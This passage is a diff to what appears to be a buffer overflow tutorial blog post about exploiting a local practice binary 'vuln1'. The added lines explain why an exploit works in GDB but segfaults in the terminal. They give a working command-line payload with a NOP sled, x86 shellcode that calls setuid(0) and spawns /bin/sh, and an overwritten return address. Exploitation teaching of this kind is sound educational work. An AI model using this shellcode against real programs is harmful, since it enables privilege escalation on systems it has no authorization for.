@@ -380,4 +380,19 @@ The last four bytes is our return address which we write done way, so the return
 ![bo-013.png](/assets/images/bo-013.png)
 **Figure 13** Our shell from vuln1 file on GDB.
 
+So now it should work directly from our terminal, after several check on my machine I found that this code give me segmentation fault, since on gdb it working, I was wonder why on that case it doesn't work right.
+
+![bo-014.png](/assets/images/bo-014.png)
+**Figure 14** Again segmentation fault.
+
+I have made some test again and came up with the following which work on the terminal directly:
+```
+./vuln1 $(python2 -c "print '\x90'*372+'\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80'+'\x21\xd0\xff\xff'+'C'*96")
+```
+
+![bo-015.png](/assets/images/bo-015.png)
+**Figure 15** Buffer overflow for new shell.
+
+That issue because there is a different between the terminal environment and gdb environment, there is solution that I have found [here](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it) which allow to run the program on the terminal and gdb in identical way so the injection code will work, we just need use `env -i "<variables> <prog>"`.
+
 So, let's summaries that, there is a path we can use to achieve our goal by manipulation the binary file it self
